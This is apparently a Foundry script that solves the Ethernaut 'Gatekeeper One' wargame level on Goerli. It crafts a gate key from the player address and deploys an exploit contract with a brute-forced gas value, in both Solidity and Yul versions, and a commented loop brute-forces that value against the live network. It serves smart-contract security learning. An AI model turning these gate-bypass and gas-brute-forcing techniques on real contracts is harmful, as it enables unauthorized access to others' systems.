// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { Gatekeeper1Exploit } from "../../contracts/13_Gatekeeper1.sol";

interface Instance {
    function entrant() external view returns (address);

    function enter(bytes8 _gateKey) external returns (bool);
}

contract Gatekeeper1Script is EthernautScript {
    string network = "goerli";
    address level = 0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        bytes8 key = bytes8(bytes.concat(bytes6(0x100000000000), bytes2(uint16(uint160(player)))));

        // the value we got from our tests didnt work, so we bruteforce it again against a live environment
        // for (uint i = 260; i > 0; i--) {
        //     try new Gatekeeper1Exploit(address(instance), key, 8191 * 5 + i) {
        //         console.log("PASS", i);
        //         break;
        //     } catch {}
        // }

        new Gatekeeper1Exploit(address(instance), key, 8191 * 5 + 256);
        require(instance.entrant() == player);
    }

    function yulVersion() internal {
        bytes memory exploitInitCode = type(Gatekeeper1Exploit).creationCode;
        assembly {
            let key := and(0xffff, sload(player.slot)) // we apply a bitmask to get only the last 2 bytes
            key := shl(192, key) // we want a bytes8, so we move the 2 bytes to the bytes 7 and 8
            key := or(shl(252, 1), key) // we add a 1 at the first byte to satisfy the condition "uint32(uint64(_gateKey)) != uint64(_gateKey)"

            let gasLeft := add(mul(8191, 5), 256)

            let size := mload(exploitInitCode)
            let paramsOffset := add(add(exploitInitCode, 0x20), size)
            mstore(exploitInitCode, add(size, 0x60)) // the constructor has 3 parameters
            mstore(paramsOffset, sload(instance.slot))
            mstore(add(paramsOffset, 0x20), key)
            mstore(add(paramsOffset, 0x40), gasLeft)
            pop(create(0, add(exploitInitCode, 0x20), mload(exploitInitCode)))

            // check: entrant() == player
            mstore(0, "entrant()")
            mstore(0, keccak256(0, 9))
            pop(staticcall(gas(), sload(instance.slot), 0, 4, 0, 0x20))
            if iszero(eq(mload(0), sload(player.slot))) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
